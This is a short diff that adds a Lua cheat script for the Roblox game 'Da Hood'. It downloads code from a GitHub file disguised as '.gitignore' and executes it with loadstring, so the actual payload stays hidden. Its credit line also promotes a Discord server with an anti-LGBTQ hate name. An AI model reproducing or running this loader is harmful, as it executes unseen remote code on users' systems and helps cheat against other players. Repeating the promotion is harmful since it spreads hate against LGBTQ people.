@@ -1,0 +1,2 @@
+-- Da Hood
+game:Load(assert(loadstring("loadstring(game:HttpGet([[https://raw.githubusercontent.com/Vanis252/valiantdhxd/main/.gitignore]],POV_Valiant_On_Top))()"))())([[This script was made by Vanis#6666 | discord.gg/lgbtqhaters | roblox.com/groups/9994296]])
